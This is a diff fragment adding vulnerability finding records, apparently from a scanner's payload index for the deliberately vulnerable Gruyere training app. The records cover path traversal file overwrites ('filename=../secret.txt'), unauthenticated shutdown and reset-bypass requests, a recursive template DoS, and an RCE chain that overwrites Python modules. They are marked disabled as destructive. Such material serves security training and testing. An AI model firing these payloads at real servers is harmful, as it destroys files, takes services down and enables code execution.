+        "title": "Path traversal file overwrite through username directory",
+        "category": "path_traversal",
+        "severity": "critical",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "username=.. + upload secret.txt",
+        "expected_indicators": [
+          "uploaded file path escapes user directory",
+          "secret.txt can be replaced"
+        ],
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      {
+        "id": "GRUYERE-PT-003",
+        "title": "Path traversal file overwrite through uploaded filename",
+        "category": "path_traversal",
+        "severity": "critical",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "filename=../secret.txt",
+        "expected_indicators": [
+          "server accepts ../ in uploaded filename",
+          "file write escapes intended user upload directory"
+        ],
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      {
+        "id": "GRUYERE-DOS-001",
+        "title": "Unauthenticated server shutdown via quitserver",
+        "category": "denial_of_service",
+        "severity": "critical",
+        "url": null,
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": "GET /quitserver",
+        "expected_indicators": [
+          "non-admin can access quitserver endpoint",
+          "server instance stops responding until restarted"
+        ],
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      {
+        "id": "GRUYERE-DOS-002",
+        "title": "Protected reset endpoint bypass through case mismatch",
+        "category": "denial_of_service",
+        "severity": "critical",
+        "url": null,
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": "GET /RESET",
+        "expected_indicators": [
+          "protected URL check is case-sensitive",
+          "routing lookup capitalizes handler name after authorization check"
+        ],
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      {
+        "id": "GRUYERE-DOS-003",
+        "title": "Template recursion DoS through uploaded menubar.gtl",
+        "category": "denial_of_service",
+        "severity": "critical",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "[[include:menubar.gtl]]DoS[[/include:menubar.gtl]]",
+        "expected_indicators": [
+          "every page includes menubar.gtl",
+          "recursive include overloads template renderer"
+        ],
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      {
+        "id": "GRUYERE-RCE-001",
+        "title": "Remote code execution chain by overwriting template infrastructure then restarting",
+        "category": "rce",
+        "severity": "critical",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "overwrite gtl.py or sanitize.py via path traversal; trigger restart through quitserver",
+        "expected_indicators": [
+          "application can write files in Gruyere directory",
+          "modified Python support module runs after server restart"
+        ],
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      }
+    ],
+    "index_type": "real_target_full_payload_links",
+    "usage": "copy_paste_or_scanner_replay",
+    "safety_note": "Only replay entries where scanner_auto_test_safe is true and destructive/manual_only are false."
+  }
+}
